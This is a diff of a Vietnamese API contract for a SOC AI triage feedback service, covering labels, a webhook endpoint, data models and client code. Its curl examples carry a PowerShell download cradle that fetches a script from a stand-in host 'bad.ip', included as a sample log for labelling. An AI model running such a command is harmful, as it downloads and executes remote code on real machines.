@@ -1,6 +1,6 @@
-# SOC AI Triage — Feedback Loop API Contract
+# SOC AI Triage — Feedback Loop API Contract (v4.0)
 
-> **Mục đích tài liệu:** Bản đặc tả API Contract này được thiết kế chi tiết, rõ ràng và chuẩn hóa để bạn có thể **gửi trực tiếp kèm theo prompt khi "vibe coding" ở bất kỳ hệ thống nào khác** (Frontend React/Vue, SOAR, SIEM, Discord/Slack Bot, Backend Microservices, Extension...). Agent ở hệ thống đó chỉ cần đọc file này là có thể tự động sinh mã nguồn tích hợp gọi Feedback Loop chính xác 100%.
+> **Mục đích tài liệu:** Bản đặc tả API Contract này được thiết kế chi tiết, rõ ràng và chuẩn hóa để bạn có thể **gửi trực tiếp kèm theo prompt khi "vibe coding" ở bất kỳ hệ thống nào khác** (Frontend React/Vue, SOAR, SIEM, Case Management, Webhook Receiver, Discord/Slack Bot, Backend Microservices...). Agent ở hệ thống đó chỉ cần đọc file này là có thể tự động sinh mã nguồn tích hợp gọi chức năng Feedback Loop chính xác 100%.
 
 ---
 
@@ -11,21 +11,23 @@ Nếu bạn dùng Cursor, Claude, ChatGPT, Copilot hoặc bất kỳ AI Agent n�
 ```markdown
 Bạn là lập trình viên tích hợp hệ thống. Hãy đọc kỹ file API Contract này để hiện thực chức năng 
 gửi phản hồi (Feedback Loop) từ hệ thống của chúng ta sang SOC AI Triage Backend.
-- Đích gọi: POST /feedback
-- Đảm bảo xử lý đầy đủ các trường: raw_log, label ("FP" | "TP" | "Incident"), analyst_comment.
-- Bắt và xử lý chính xác các HTTP status codes: 200, 422, 503, và lỗi mạng (timeout/connect error).
-- Hiển thị phản hồi trực quan cho người dùng gồm: action (inserted/reinforced/corrected) và trust_score (1-5 sao).
+- Đích gọi chính: POST /feedback (Gửi feedback trực tiếp theo log)
+- Đích gọi webhook (Case Management): POST /webhook/feedback (Gửi feedback theo case_id)
+- Hệ nhãn chuẩn hóa (Unified Labels): "TruePositive" | "FalsePositive" | "Benign" | "Suspicious"
+- Đảm bảo bắt và xử lý chính xác các HTTP status codes: 200, 422, 503, và lỗi kết nối mạng.
+- Đối với POST /feedback: Hiển thị phản hồi trực quan gồm action (inserted/reinforced/corrected) và trust_score (1-5 sao).
 ```
 
 ---
 
 ## 1. Tổng quan kiến trúc & Cơ chế hoạt động của Feedback Loop
 
-Feedback Loop là cơ chế **Active Learning (Human-in-the-Loop)** giúp hệ thống SOC AI ngày càng thông minh hơn:
-1. Khi Chuyên viên phân tích SOC (hoặc hệ thống của bạn) xác nhận hoặc sửa nhãn của một log bảo mật:
-   - **`FP` (False Positive):** Cảnh báo giả, hành vi bình thường, IP quét an ninh định kỳ, v.v.
-   - **`TP` (True Positive):** Tấn công mạng thực sự đã được phát hiện.
-   - **`Incident`:** Sự cố nghiêm trọng cần kích hoạt quy trình ứng cứu sự cố khẩn cấp.
+Feedback Loop là cơ chế **Active Learning (Human-in-the-Loop)** giúp hệ thống SOC AI liên tục tự học và cải thiện độ chính xác:
+1. Khi Chuyên viên phân tích SOC hoặc Hệ thống Quản lý Case (Case Management / SOAR) xác nhận hoặc sửa nhãn của một log/alert:
+   - **`TruePositive`:** Tấn công an ninh mạng thực sự, có mã độc, khai thác lỗ hổng hoặc hành vi xâm nhập.
+   - **`FalsePositive`:** Cảnh báo sai, nhầm lẫn do chữ ký luật, công cụ quét an ninh định kỳ hoặc lưu lượng bình thường bị gắn cờ nhầm.
+   - **`Benign`:** Hoạt động an toàn, bình thường, tác vụ quản trị hợp lệ đã được xác minh.
+   - **`Suspicious`:** Đáng ngờ, bất thường chưa đủ chứng cứ để kết luận tấn công, cần theo dõi thêm.
 2. Hệ thống backend sẽ:
    - Vector hóa log (`raw_log`) bằng mô hình embedding `nomic-ai/nomic-embed-text-v1.5` (768 chiều).
    - Tra cứu trong Vector Database (**Qdrant**) với ngưỡng tương đồng Cosine Similarity `0.92`.
@@ -69,14 +71,14 @@ sequenceDiagram
 | :--- | :--- | :--- |
 | **Local Machine (Cùng máy Host)** | `http://localhost:8080` | Khi hệ thống khác chạy trực tiếp trên máy dev |
 | **LAN / Remote Server** | `http://<IP_MAY_CHU_SOC>:8080` | Khi hệ thống khác chạy ở máy khác trong mạng nội bộ / VPN |
-| **Cùng mạng Docker (Docker Compose)** | `http://api-backend:8080` | Khi hệ thống khác là 1 service trong Docker Compose cùng network `chilling-soc-net` |
+| **Cùng mạng Docker (Docker Compose)** | `http://api-backend:8080` | Khi hệ thống khác là 1 container cùng network `chilling-soc-net` |
 
 ### 2.2 Chính sách CORS (Cross-Origin Resource Sharing)
 
-Hệ thống đã được cấu hình **mở hoàn toàn (Fully Permissive CORS)**:
-- `Access-Control-Allow-Origin: *` (Cho phép mọi domain, mọi port, mọi frontend client gọi trực tiếp không bị chặn).
+Hệ thống backend đã được cấu hình **mở hoàn toàn (Fully Permissive CORS)**:
+- `Access-Control-Allow-Origin: *` (Cho phép mọi origin, port, frontend client gọi trực tiếp không bị chặn).
 - `Access-Control-Allow-Methods: *` (GET, POST, OPTIONS, PUT, DELETE...).
-- `Access-Control-Allow-Headers: *` (Cho phép mọi request header như `Content-Type`, `Authorization`...).
+- `Access-Control-Allow-Headers: *` (Cho phép mọi request headers như `Content-Type`, `Authorization`, `X-API-Key`...).
 - `Access-Control-Expose-Headers: *` (Cho phép client đọc tất cả response headers).
 - `Access-Control-Max-Age: 86400` (Preflight OPTIONS được cache 24h để tối ưu tốc độ).
 
@@ -86,7 +88,7 @@ Hệ thống đã được cấu hình **mở hoàn toàn (Fully Permissive CORS
 
 ## 3. Liveness Check Endpoint (`GET /health`)
 
-Trước khi gọi feedback, client có thể thăm dò trạng thái kết nối tới SOC Backend:
+Trước khi thực hiện tích hợp, client có thể thăm dò trạng thái kết nối tới SOC Backend:
 
 - **Method:** `GET`
 - **Path:** `/health`
@@ -100,19 +102,22 @@ Trước khi gọi feedback, client có thể thăm dò trạng thái kết nố
   "llm": "connected",
   "llm_models": [
     "fdtn-ai/Foundation-Sec-8B"
-  ]
+  ],
+  "sqlite": "connected",
+  "sqlite_cases_count": 12
 }
 ```
-> Nếu trường `"qdrant": "unreachable"`, việc gọi `/feedback` có thể trả về lỗi `503 Service Unavailable`.
 
 ---
 
-## 4. Đặc tả chi tiết Endpoint Feedback (`POST /feedback`)
+## 4. Đặc tả Chi tiết Endpoint Feedback Trực tiếp (`POST /feedback`)
+
+Sử dụng endpoint này khi bạn có chuỗi log thô và muốn chuyên viên phân tích gắn nhãn để dạy AI ngay lập tức.
 
 - **Method:** `POST`
 - **Path:** `/feedback`
 - **Full URL:** `http://localhost:8080/feedback`
-- **Headers bắt buộc:**
+- **Headers:**
   ```http
   Content-Type: application/json
   Accept: application/json
@@ -120,20 +125,18 @@ Trước khi gọi feedback, client có thể thăm dò trạng thái kết nố
 
 ### 4.1 Request Body Schema
 
-Dữ liệu gửi lên là một JSON Object với các trường sau:
-
 | Trường | Kiểu dữ liệu | Bắt buộc | Mặc định | Ràng buộc / Enum | Mô tả |
 | :--- | :--- | :---: | :---: | :--- | :--- |
 | `raw_log` | `string` | **Có** | — | `min_length >= 1` | Nội dung log thô cần lưu feedback (Syslog, Suricata, Windows Event, Firewall, JSON string...). |
-| `label` | `string` | **Có** | — | `"FP"` \| `"TP"` \| `"Incident"` | **FP**: False Positive (bình thường/cảnh báo giả)<br>**TP**: True Positive (tấn công thực sự)<br>**Incident**: Sự cố khẩn cấp |
-| `analyst_comment` | `string` | Không | `""` | Chuỗi văn bản | Ghi chú, giải thích của chuyên viên phân tích (ví dụ: "IP của Nessus scanner", "Hành vi brute-force SSH"). |
+| `label` | `string` | **Có** | — | `"TruePositive"` \| `"FalsePositive"` \| `"Benign"` \| `"Suspicious"` | Nhãn đánh giá của chuyên viên phân tích. |
+| `analyst_comment` | `string` | Không | `""` | Chuỗi văn bản | Ghi chú, giải thích của chuyên viên phân tích (ví dụ: "IP scanner nội bộ đã xác minh", "Khai thác lỗ hổng Log4j"). |
 
 #### Ví dụ Request Body:
 ```json
 {
   "raw_log": "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 OUT= SRC=203.0.113.42 DST=10.0.0.5 PROTO=TCP SPT=49152 DPT=443",
-  "label": "FP",
-  "analyst_comment": "IP 203.0.113.42 là địa chỉ của máy kiểm thử bảo mật định kỳ, lưu lượng bình thường."
+  "label": "FalsePositive",
+  "analyst_comment": "IP 203.0.113.42 là địa chỉ của máy kiểm thử bảo mật định kỳ, lưu lượng an toàn."
 }
 ```
 
@@ -141,13 +144,11 @@ Dữ liệu gửi lên là một JSON Object với các trường sau:
 
 ### 4.2 Response Schema (Thành công - HTTP 200 OK)
 
-Trả về JSON Object xác nhận đã lưu thành công vào Vector DB:
-
 | Trường | Kiểu dữ liệu | Giá trị có thể có | Mô tả |
 | :--- | :--- | :--- | :--- |
 | `status` | `string` | `"stored"` | Trạng thái lưu trữ thành công |
 | `point_id` | `string` | UUID string (vd: `3fa85f64-5717-4562-b3fc-2c963f66afa6`) | Định danh bản ghi trong Qdrant Vector DB |
-| `action` | `string` | `"inserted"` \| `"reinforced"` \| `"corrected"` | Hành vi xử lý của hệ thống (xem chi tiết bên dưới) |
+| `action` | `string` | `"inserted"` \| `"reinforced"` \| `"corrected"` | Hành vi xử lý của hệ thống |
 | `trust_score` | `integer` | `1` đến `5` | Điểm tin cậy hiện tại của tri thức này (1 sao đến 5 sao) |
 
 #### Ý nghĩa của trường `action`:
@@ -187,60 +188,70 @@ Trả về JSON Object xác nhận đã lưu thành công vào Vector DB:
 
 ---
 
-### 4.3 Error Responses (Mã lỗi & Cách xử lý)
+## 5. Đặc tả Endpoint Webhook Feedback (`POST /webhook/feedback`)
 
-| HTTP Code | Tên lỗi | Nguyên nhân | Cấu trúc Body | Hành động đề xuất cho Client |
-| :---: | :--- | :--- | :--- | :--- |
-| **`422`** | Unprocessable Entity | Dữ liệu gửi lên sai định dạng (thiếu `raw_log`, `raw_log` rỗng, hoặc `label` không nằm trong enum `["FP", "TP", "Incident"]`). | `{"detail": [{"loc": ["body", "label"], "msg": "Input should be 'FP', 'TP' or 'Incident'", "type": "literal_error"}]}` | Kiểm tra và validate form input trước khi gửi request. |
-| **`503`** | Service Unavailable | Qdrant Vector DB gặp sự cố hoặc không ghi được dữ liệu. | `{"detail": "Vector DB write failed: <thông tin lỗi>"}` | Thông báo người dùng thử lại sau, hoặc thử kiểm tra `GET /health`. |
-| **`502` / `ConnectError`** | Bad Gateway / Network Error | Backend chưa bật hoặc sai cổng/IP mạng. | HTML/Text hoặc Network Exception từ thư viện HTTP | Kiểm tra lại URL backend và mạng kết nối. |
+Sử dụng endpoint này khi hệ thống khác là **Case Management / SOAR** gửi webhook về sau khi ticket/case được giải quyết đóng lại. Hệ thống SOC sẽ tự động truy vấn lại các events gốc từ SQLite theo `case_id` (chính là `alert_id`) và cập nhật Gradual Trust vào Vector DB cho toàn bộ log đó.
 
-#### Ví dụ phản hồi lỗi 422 khi truyền sai `label`:
+- **Method:** `POST`
+- **Path:** `/webhook/feedback`
+- **Full URL:** `http://localhost:8080/webhook/feedback`
+- **Headers:** `Content-Type: application/json`
+
+### 5.1 Request Body Schema (Webhook)
+
+| Trường | Kiểu dữ liệu | Bắt buộc | Mô tả |
+| :--- | :--- | :---: | :--- |
+| `case_id` | `string` | **Có** | Khớp với `alert_id` đã phân tích trước đó trong hệ thống |
+| `verdict` | `string` | **Có** | `"TruePositive"` \| `"FalsePositive"` \| `"Benign"` \| `"Suspicious"` |
+| `event` | `string` | Không | Văn bản log sự kiện (tùy chọn) |
+| `feedback_id`| `string` | Không | ID phản hồi từ hệ thống bên ngoài |
+| `user_id` | `string` | Không | ID chuyên viên phân tích bên hệ thống Case Mgmt |
+| `comment` | `string` | Không | Nhận xét / Kết luận của analyst khi đóng case |
+| `created_at`| `string` | Không | Timestamp ISO 8601 (vd: `2026-09-12T10:00:00Z`) |
+
+#### Ví dụ Request Webhook:
 ```json
 {
-  "detail": [
-    {
-      "type": "literal_error",
-      "loc": ["body", "label"],
-      "msg": "Input should be 'FP', 'TP' or 'Incident'",
-      "input": "BENIGN",
-      "ctx": {
-        "expected": "'FP', 'TP' or 'Incident'"
-      }
-    }
-  ]
+  "case_id": "ALERT-20260912-9981",
+  "verdict": "TruePositive",
+  "comment": "Xác nhận máy chủ bị nhiễm mã độc đào tiền ảo qua cổng 8080",
+  "user_id": "analyst_ha",
+  "feedback_id": "FB-88319"
 }
 ```
 
-#### Ví dụ phản hồi lỗi 422 khi thiếu `raw_log`:
+### 5.2 Response Schema (Webhook)
 ```json
 {
-  "detail": [
-    {
-      "type": "missing",
-      "loc": ["body", "raw_log"],
-      "msg": "Field required",
-      "input": {}
-    }
-  ]
+  "status": "received"
 }
 ```
 
 ---
 
-## 5. TypeScript & Python Data Contracts (Dành cho Vibe Coding)
+## 6. Error Responses & Mã lỗi HTTP
 
-### 5.1 TypeScript / JavaScript Interfaces
+| HTTP Code | Tên lỗi | Nguyên nhân | Cấu trúc Body | Hành động đề xuất cho Client |
+| :---: | :--- | :--- | :--- | :--- |
+| **`422`** | Unprocessable Entity | Dữ liệu gửi lên sai định dạng (thiếu `raw_log`, `raw_log` rỗng, hoặc `label` không nằm trong enum hợp lệ). | `{"detail": [{"loc": ["body", "label"], "msg": "Input should be 'TruePositive', 'FalsePositive', 'Benign' or 'Suspicious'", "type": "literal_error"}]}` | Kiểm tra và validate form input trước khi gửi request. |
+| **`503`** | Service Unavailable | Qdrant Vector DB gặp sự cố hoặc không ghi được dữ liệu. | `{"detail": "Vector DB write failed: <thông tin lỗi>"}` | Thông báo người dùng thử lại sau, hoặc kiểm tra `GET /health`. |
+| **`502` / `ConnectError`** | Bad Gateway / Network Error | Backend chưa bật hoặc sai cổng/IP mạng. | HTML/Text hoặc Network Exception từ thư viện HTTP | Kiểm tra lại URL backend và kết nối container/server. |
+
+---
+
+## 7. TypeScript & Python Data Contracts (Dành cho Vibe Coding)
+
+### 7.1 TypeScript / JavaScript Interfaces
 
 ```typescript
-export type FeedbackLabel = "FP" | "TP" | "Incident";
+export type UnifiedLabel = "TruePositive" | "FalsePositive" | "Benign" | "Suspicious";
 export type FeedbackAction = "inserted" | "reinforced" | "corrected";
 
 export interface FeedbackRequest {
   /** Nội dung log thô bắt buộc, không được để trống */
   raw_log: string;
-  /** Nhãn phân loại bảo mật */
-  label: FeedbackLabel;
+  /** Nhãn phân loại bảo mật chuẩn hóa */
+  label: UnifiedLabel;
   /** Ghi chú phân tích của chuyên viên (tùy chọn) */
   analyst_comment?: string;
 }
@@ -256,23 +267,39 @@ export interface FeedbackResponse {
   trust_score: number;
 }
 
+export interface WebhookFeedbackRequest {
+  /** Khớp với alert_id đã gửi phân tích */
+  case_id: string;
+  /** Phán quyết đóng case */
+  verdict: UnifiedLabel;
+  event?: string;
+  feedback_id?: string;
+  user_id?: string;
+  comment?: string;
+  created_at?: string;
+}
+
 export interface HealthCheckResponse {
   status: "healthy" | string;
   qdrant?: "connected" | "unreachable";
   llm?: "connected" | "unreachable";
   llm_models?: string[];
+  sqlite?: "connected" | "unreachable";
+  sqlite_cases_count?: number;
 }
 ```
 
-### 5.2 Python Pydantic Models
+### 7.2 Python Pydantic Models
 
 ```python
-from typing import Literal
+from typing import Literal, Optional
 from pydantic import BaseModel, Field
+
+UnifiedLabel = Literal["TruePositive", "FalsePositive", "Benign", "Suspicious"]
 
 class FeedbackRequest(BaseModel):
     raw_log: str = Field(..., min_length=1, description="Raw log entry to store feedback for")
-    label: Literal["FP", "TP", "Incident"]
+    label: UnifiedLabel
     analyst_comment: str = Field(default="", description="Analyst comment for the feedback")
 
 class FeedbackResponse(BaseModel):
@@ -280,13 +307,22 @@ class FeedbackResponse(BaseModel):
     point_id: str
     action: Literal["inserted", "reinforced", "corrected"]
     trust_score: int = Field(ge=1, le=5)
+
+class WebhookFeedbackRequest(BaseModel):
+    case_id: str
+    verdict: UnifiedLabel
+    event: str = ""
+    feedback_id: str = ""
+    user_id: str = ""
+    comment: str = ""
+    created_at: str = ""
 ```
 
 ---
 
-## 6. Code mẫu tích hợp sẵn sàng Copy-Paste
+## 8. Code mẫu tích hợp sẵn sàng Copy-Paste
 
-### 6.1 TypeScript / JavaScript (Modern `fetch`)
+### 8.1 TypeScript / JavaScript (Modern `fetch`)
 
 ```typescript
 /**
@@ -298,7 +334,7 @@ export async function submitSOCFeedback(
   baseUrl: string,
   payload: {
     raw_log: string;
-    label: "FP" | "TP" | "Incident";
+    label: "TruePositive" | "FalsePositive" | "Benign" | "Suspicious";
     analyst_comment?: string;
   }
 ) {
@@ -323,7 +359,7 @@ export async function submitSOCFeedback(
       const errJson = await response.json();
       errorDetail = JSON.stringify(errJson);
     } catch {
-      // ignore json parse error
+      // ignore non-json error
     }
     throw new Error(`Failed to submit feedback: ${errorDetail}`);
   }
@@ -339,14 +375,14 @@ export async function submitSOCFeedback(
 // ── Ví dụ gọi hàm:
 // submitSOCFeedback("http://localhost:8080", {
 //   raw_log: "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 ...",
-//   label: "FP",
-//   analyst_comment: "IP scan nội bộ",
+//   label: "FalsePositive",
+//   analyst_comment: "IP scan nội bộ đã được phê duyệt",
 // }).then((res) => {
 //   console.log("Feedback saved:", res.action, "Trust:", res.trust_score);
 // });
 ```
 
-### 6.2 Python (`httpx` / `requests`)
+### 8.2 Python (`httpx` / `requests`)
 
 ```python
 import httpx
@@ -354,7 +390,7 @@ import httpx
 def send_feedback(
     base_url: str,
     raw_log: str,
-    label: str,  # "FP", "TP", or "Incident"
+    label: str,  # "TruePositive", "FalsePositive", "Benign", "Suspicious"
     comment: str = "",
     timeout: float = 30.0,
 ) -> dict:
@@ -374,54 +410,55 @@ def send_feedback(
 # res = send_feedback(
 #     base_url="http://localhost:8080",
 #     raw_log="192.168.1.50 - - [12/Sep/2026:10:00:00 +0000] \"GET /admin/shell.php HTTP/1.1\" 404",
-#     label="TP",
+#     label="TruePositive",
 #     comment="Webshell probing attack detected on perimeter",
 # )
 # print(f"Action: {res['action']} | Trust Score: {res['trust_score']}/5 | ID: {res['point_id']}")
 ```
 
-### 6.3 cURL Command Test nhanh
+### 8.3 cURL Command Test nhanh
 
 ```bash
-# 1. Gửi Feedback nhãn False Positive (FP)
+# 1. Gửi Feedback nhãn FalsePositive
 curl -X POST "http://localhost:8080/feedback" \
      -H "Content-Type: application/json" \
      -d '{
        "raw_log": "Aug 22 14:33:12 fw01 kernel: DROP IN=eth0 OUT= SRC=203.0.113.42 DST=10.0.0.5 PROTO=TCP DPT=443",
-       "label": "FP",
+       "label": "FalsePositive",
        "analyst_comment": "Whitelisted scanner IP"
      }'
 
-# 2. Gửi Feedback nhãn True Positive (TP)
+# 2. Gửi Feedback nhãn TruePositive
 curl -X POST "http://localhost:8080/feedback" \
      -H "Content-Type: application/json" \
      -d '{
        "raw_log": "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\x27http://bad.ip/evil.ps1\x27))",
-       "label": "TP",
+       "label": "TruePositive",
        "analyst_comment": "PowerShell download cradle detected"
      }'
 
-# 3. Gửi Feedback nhãn Incident
-curl -X POST "http://localhost:8080/feedback" \
+# 3. Gửi Webhook Feedback từ Case Management
+curl -X POST "http://localhost:8080/webhook/feedback" \
      -H "Content-Type: application/json" \
      -d '{
-       "raw_log": "w3wp.exe spawned cmd.exe whoami /priv -> Domain Controller synced NTDS.dit dump",
-       "label": "Incident",
-       "analyst_comment": "Active RCE webshell escalating to domain compromise"
+       "case_id": "ALERT-20260912-001",
+       "verdict": "TruePositive",
+       "comment": "Closed as confirmed malware incident",
+       "user_id": "analyst_1"
      }'
 ```
 
 ---
 
-## 7. Checklist kiểm tra khi Vibe Code
+## 9. Checklist kiểm tra khi Vibe Code
 
 Khi agent ở hệ thống khác code xong, bạn có thể kiểm tra nhanh theo checklist sau:
 
-- [ ] **URL cấu hình:** Có thể linh hoạt đổi giữa `http://localhost:8080` (dev) và URL production qua biến môi trường (ví dụ `REACT_APP_SOC_API_URL` hoặc `VITE_SOC_API_URL` hoặc `SOC_API_URL`).
-- [ ] **Validation đầu vào:** Không gửi request nếu `raw_log` rỗng hoặc chỉ có khoảng trắng.
-- [ ] **Nhãn hợp lệ:** Giá trị `label` bắt buộc phải là một trong ba chuỗi chính xác: `"FP"`, `"TP"`, hoặc `"Incident"`.
+- [ ] **URL cấu hình:** Cho phép cấu hình endpoint linh hoạt qua biến môi trường (ví dụ `VITE_SOC_API_URL` hoặc `SOC_API_URL`).
+- [ ] **Validation đầu vào:** Không gửi request nếu `raw_log` (hoặc `case_id`) rỗng hoặc chỉ có khoảng trắng.
+- [ ] **Nhãn hợp lệ:** Giá trị `label` / `verdict` bắt buộc phải là một trong bốn giá trị chuẩn: `"TruePositive"`, `"FalsePositive"`, `"Benign"`, hoặc `"Suspicious"`.
 - [ ] **Xử lý UI trạng thái:**
-  - Nếu `action == "inserted"`: Hiển thị thông báo "Đã tạo mẫu mới vào cơ sở tri thức (Trust: 1/5)".
+  - Nếu `action == "inserted"`: Hiển thị thông báo "Đã thêm mẫu mới vào cơ sở tri thức (Trust: 1/5)".
   - Nếu `action == "reinforced"`: Hiển thị thông báo "Đã củng cố độ tin cậy của mẫu (Trust: X/5)".
   - Nếu `action == "corrected"`: Hiển thị thông báo "Đã hiệu chỉnh lại nhãn phân loại (Trust reset về 1/5)".
-- [ ] **Bắt lỗi mạng:** Có spinner/loading và thông báo lỗi rõ ràng nếu backend không phản hồi hoặc trả về mã lỗi 4xx/5xx.
+- [ ] **Bắt lỗi mạng:** Có loading indicator và thông báo lỗi rõ ràng nếu backend không phản hồi hoặc trả về mã lỗi 4xx/5xx.
